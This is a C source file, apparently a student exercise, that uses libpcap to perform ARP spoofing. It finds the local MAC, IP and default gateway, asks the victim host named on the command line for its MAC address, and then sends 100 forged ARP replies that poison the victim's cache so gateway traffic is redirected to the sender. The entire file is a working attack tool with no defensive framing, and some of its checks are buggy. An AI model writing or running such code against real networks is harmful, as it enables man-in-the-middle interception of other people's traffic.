#include<stdio.h>
#include<pcap.h>
#include<arpa/inet.h>
#include<sys/socket.h>
#include<net/if.h>
#include<string.h>
#include<sys/ioctl.h>
#include<ifaddrs.h>
#include<unistd.h>
#include<stdlib.h>
#include<time.h>

char* getmyip(char *dev ){
	struct ifaddrs *ifap, *ifa;
	struct sockaddr_in *sa;
	
	char* addr;
	addr = (char*)calloc(1, INET_ADDRSTRLEN);
	

	if ( getifaddrs(&ifap) == -1){
		return 0;
	}

	for(ifa = ifap; ifa;ifa = ifa -> ifa_next){

		if(ifa->ifa_addr->sa_family==AF_INET){
			sa = (struct sockaddr_in *) ifa->ifa_addr;
			inet_ntop(AF_INET, &(sa->sin_addr),addr,INET_ADDRSTRLEN);

			if(ifa->ifa_name == dev){
			break;
			}
		}	

	}
	return addr;

}


unsigned char* getmyMAC(char *pIface){
	int nSD;
	struct ifreq sIfReq;
	struct if_nameindex *pIfList;
	struct if_nameindex *pListSave;

	unsigned char* cMacAddr;
	cMacAddr = (unsigned char*)calloc(6, sizeof(unsigned char));

	pIfList = (struct if_nameindex *) NULL;
	pListSave = (struct if_nameindex *) NULL;

	nSD = socket (PF_INET, SOCK_STREAM, 0);
	
	if( nSD < 0){
		return 0;
	}

	pIfList = pListSave = if_nameindex();

	for( pIfList ; *(char *)pIfList !=0; pIfList++)
	{
		if( strcmp(pIfList->if_name, pIface)) continue;

	
		strncpy(sIfReq.ifr_name, pIfList->if_name, IF_NAMESIZE);
		if (ioctl(nSD, SIOCGIFHWADDR, &sIfReq) != 0){
			return 0;
		}
	
		memmove( (void *)&cMacAddr[0], (void *)&sIfReq.ifr_ifru.ifru_hwaddr.sa_data[0], 6);
		break;

	}

	if_freenameindex( pListSave);
	close(nSD);
	
	return cMacAddr;

}

struct ethernet{
	u_int8_t  ether_dhost[6];
	u_int8_t  ether_shost[6];
	u_int16_t ether_type;                 

};

struct ARP{
	u_int16_t Hardware_type;
	u_int16_t Protocol_type;
	u_int8_t Hardware_size;
	u_int8_t Protocol_size;
	u_int16_t Opcode;
	u_int8_t shost_MAC[6];
	u_int8_t shost_ip[4];
	u_int8_t dhost_MAC[6];
	u_int8_t dhost_ip[4];
};


struct send_data{
	struct ethernet eth;
	struct ARP arp;

};

#define ARP_REPLY  2
#define ARP_REQUEST 1

//if arp_reply, send_MAC changes position with target_MAC.

int SendARP(pcap_t *handle, unsigned char *send_MAC, unsigned char *target_MAC, char *send_ip, char *target_ip, int type){
	
	struct send_data data;
	struct sockaddr_in conv_ip;

	unsigned char data1[sizeof(send_data)];

	if (type == ARP_REQUEST) for(int i = 0; i < 6; i++) data.eth.ether_dhost[i]=0xff;
	else if(type == ARP_REPLY) for(int i = 0; i < 6; i++) data.eth.ether_dhost[i]=send_MAC[i];
	else return -1;

	for(int i = 0; i < 6; i++) data.eth.ether_shost[i]=target_MAC[i];
	data.eth.ether_type=ntohs(0x0806);
	data.arp.Hardware_type=ntohs(0x0001);
	data.arp.Protocol_type=ntohs(0x0800);
	data.arp.Hardware_size=0x06;
	data.arp.Protocol_size=0x04;

	if (type == ARP_REQUEST)data.arp.Opcode=ntohs(0x0001);
	else if(type == ARP_REPLY) data.arp.Opcode=ntohs(0x0002);
	else return -1;

	for(int i = 0; i < 6; i++) data.arp.shost_MAC[i]=target_MAC[i];

	inet_aton(send_ip, &conv_ip.sin_addr);
	for(int i = 0; i < 4; i++) data.arp.shost_ip[i]= ((conv_ip.sin_addr.s_addr & (0xff << (i * 8))) >> (i * 8));

	if (type == ARP_REQUEST) for(int i = 0; i < 6; i++) data.arp.dhost_MAC[i]=0x00;
	else if(type == ARP_REPLY) for(int i = 0; i < 6; i++) data.arp.dhost_MAC[i]=send_MAC[i];
	else return -1;

	inet_aton(target_ip, &conv_ip.sin_addr);
	for(int i = 0; i < 4; i++) data.arp.dhost_ip[i]= ((conv_ip.sin_addr.s_addr & (0xff << (i * 8))) >> (i * 8));
	
	
	memcpy(data1, &data, sizeof(send_data));

	pcap_sendpacket(handle, data1, sizeof(send_data)); 

	return 0;
}

u_int8_t* getyourMAC(pcap_t * handle, unsigned char *MAC, char *send_ip, char *target_ip){
	
	struct pcap_pkthdr *header;
	const u_char *pkt_data;	
	
	ethernet *eth_hdr;
	ARP *arp_hdr;

	time_t start, end;
	int check = 0;
	double dif = 0;

	u_int8_t* yourMAC;
	yourMAC = (u_int8_t*)calloc(6, sizeof(u_int8_t));
	struct sockaddr_in conv_ip;
	u_int8_t ipaddress[4];	

	while(check == 0)
	{
		
		SendARP(handle, NULL ,MAC, send_ip, target_ip, ARP_REQUEST);
		time(&start);

		while(1)
		{
			int i, res;
			res = pcap_next_ex(handle, &header, &pkt_data);
			time(&end);
			dif = difftime(end, start);

			if( dif > 1 ) break;  // if it occurs time-out, try to re-send arp packet.

			if(res <= 0) continue;

			eth_hdr = (ethernet*)pkt_data;
			if((ntohs(eth_hdr->ether_type))==0x0806){
				arp_hdr = (ARP*)(eth_hdr + 1);
				if(ntohs(arp_hdr->Opcode)==0x0002){
					inet_aton(send_ip, &conv_ip.sin_addr);
					for(i = 0; i < 4; i++){
						ipaddress[i]= ((conv_ip.sin_addr.s_addr & (0xff << (i * 8))) >> (i * 8));
						if(ipaddress[i] != arp_hdr->dhost_ip[i]) continue;
					}
			
					inet_aton(target_ip, &conv_ip.sin_addr);
					for(i = 0; i < 4; i++){
						ipaddress[i]= ((conv_ip.sin_addr.s_addr & (0xff << (i * 8))) >> (i * 8));
						if(ipaddress[i] != arp_hdr->shost_ip[i]) continue;
					}

					for(i=0; i<6; i++) {
						yourMAC[i] = arp_hdr->shost_MAC[i];
					}
				check = 1;
				break;

				}
			}	

		}
	}
	
	return yourMAC;

}

char* GetGatewayForInterface(const char* interface){
	char* gateway = NULL;
	FILE* fp = popen("netstat -rn", "r");
	char line[256]={0x0};

	while(fgets(line, sizeof(line), fp) != NULL)
	{
		char* destination;
		destination = strndup(line, 15);

		char* iface;
		iface = strndup(line + 73, 4);

		if(strcmp("0.0.0.0        ",destination) == 0 && strcmp(iface, interface) == 0){
			gateway = strndup(line + 16, 15);		
		}

		free(destination);
		free(iface);

	}

	pclose(fp);
	return gateway;



}


int main(int argc, char **argv){
	pcap_t *handle;
	char *dev;
	char errbuf[PCAP_ERRBUF_SIZE];
	int res;

	unsigned char* myMacAddr;
	unsigned char* dMacAddr;


	if(argc != 2){
		printf("error.\n");
		return -2;
	}

	char *myaddr;
	char *gatewayip=NULL;

	u_int8_t *victimMAC=NULL; 


	u_char packet[100];
	// packet.

	dev = pcap_lookupdev(errbuf);
	handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);

	if(handle == NULL){
		printf("Couldn't open device.\n");
		return -1;
	}

		

	myaddr = getmyip(dev);
	myMacAddr = getmyMAC(dev);

	printf("My mac: ");
	for(int i= 0; i < 6; i++){
		printf("%02X ",myMacAddr[i]);
	}
	printf("\n");	

	gatewayip = GetGatewayForInterface(dev);
	victimMAC = getyourMAC(handle, myMacAddr, myaddr, argv[1]);

	
	printf("Victim mac: ");
	for(int i= 0; i < 6; i++){
		printf("%02X ",victimMAC[i]);
	}
	printf("\n");

	for(int i = 0; i < 100; i++){
		SendARP(handle, victimMAC, myMacAddr, gatewayip,argv[1],ARP_REPLY);
		printf("%d send arp-reply packet.\n",i+1);
		sleep(1);
	}

	
	free(myMacAddr);
	free(victimMAC);
	free(myaddr);

//	pthread_t thread_t;

//	pthread_create(&thread_t, NULL, time_out, NULL);
//	pthread_join(&thread_t, NULL);
// thread timeout.
	

}
